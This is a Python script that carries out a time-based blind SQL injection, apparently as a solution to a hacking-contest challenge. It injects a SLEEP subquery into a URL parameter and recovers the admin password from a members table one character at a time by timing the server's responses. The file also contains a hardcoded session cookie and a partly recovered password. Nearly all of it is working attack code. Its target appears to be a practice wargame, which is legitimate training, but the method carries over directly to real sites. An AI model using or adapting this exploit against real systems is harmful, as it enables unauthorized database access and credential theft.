# -*- coding: utf-8 -*-
import time
import requests

#url = "http://192.168.0.3/fuckinforum/index.php"
url = "http://hacking.newbiecontest.org:10080/ep22/index.php"
cookies = {"PHPSESSID" : "47ca743b160b22b9017837db3ca5f8c3"}
# 0: len(goodpwd)+1, 1: goodpwd + tested char in ASCII
inj = '(SELECT SLEEP(10) FROM membres_hack WHERE login=CHAR(97,100,109,105,110) AND BINARY SUBSTRING(pass,1,{0})=CHAR({1}))'

# a-z: 97-122
# A-Z: 65-90
# 0-9: 48-57
# 48-57, 65-90, 97-122
#alphanum = 'azertyuiopmlkjhgfdsqwxcvbn'
#alphanum += alphanum.upper()
#alphanum += '0987654321'

alphanum = u'azrtyuiopmkjhgdsqwxv'
#alphanum += alphanum.upper()
alphanum += u'0987654321àè '
alphanum = u"hébenlcf" + alphanum

goodpwd = u'hébenelleestlonguecettepunaisedepreuv'
done = False

def formatpwd(pwd):
    a = [str(ord(char)) for char in pwd]
    return ','.join(a)

while not done:
    done = True
#    for char in alphanum:
    for char in alphanum:
        time.sleep(1)
        print("trying " + char)
        start = time.time()
        
        params = {'p': 'memberlist', 'ord':'1', 'type': inj.format(str(len(goodpwd)+1), formatpwd(goodpwd+char))}

        r = requests.get(url, cookies=cookies, params=params)
        end = time.time()
        
        if end-start >= 9:
            goodpwd += char
            print("hit! goodpwd = " + goodpwd)
            done = False
            break

print("done ; pwd = " + goodpwd)
